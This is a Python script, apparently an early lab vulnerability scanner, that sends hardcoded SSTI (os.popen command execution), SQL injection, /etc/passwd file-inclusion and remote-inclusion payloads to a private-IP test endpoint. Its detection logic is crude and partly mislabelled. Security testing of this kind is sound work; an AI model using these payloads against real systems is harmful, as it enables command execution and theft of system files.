import requests
import json

class Scanner:
    def __init__(self):
        """value to be tested such as payload and web url; planned to be dynamically inserted by user from command line;
        for now will be hardcoded"""
        self.url = "http://10.10.5.130:8000/api/lfivuln"
        self.ssti_payload = "{{namespace.__init__.__globals__.os.popen('id').read()}}"
        self.sqli_payload = "\\'or 1=1--"
        self.lfi_payload = "/etc/passwd"
        self.rfi_payload = "http://127.0.0.1:4444/github-token"
        
class Injection(Scanner):
    def ssti(self):
        request_body = {"mathexp": self.ssti_payload}
        response = requests.post(self.url, json=request_body, timeout=10)
        if response.status_code == 200:
            print(response.text)
            print("Vulnerable to SSTI!")
        else:
            print("Not vulnerable")
    
    def xss(self):
        pass

    def sqli(self):
        request_body = {"username": self.sqli_payload, "password": ""}
        print(request_body)
        response = requests.post(self.url, json=request_body, timeout=10)
        if response.status_code == 200:
            print(response.text)
            print("Vulnerable to SSTI!")
        else:
            print("Not vulnerable")

class BrokenAccessControl(Scanner):
    def lfi(self):
        request_body = {"filename": self.lfi_payload}
        response = requests.post(self.url, json=request_body, timeout=10)
        if response.status_code == 200:
            print(response.text)
            print("Vulnerable to LFI!")
        else:
            print("Not vulnerable")

    def rfi(self):
        request_body = {"imagelink": self.rfi_payload}
        response = requests.post(self.url, json=request_body, timeout=10)
        if response.status_code == 200:
            print(response.text)
            print("Vulnerable to RFI!")
        else:
            print("Not vulnerable")

if __name__ == "__main__":
    #injection_client = Injection()
    #injection_client.sqli()
    file_inclusion = BrokenAccessControl()
    file_inclusion.lfi()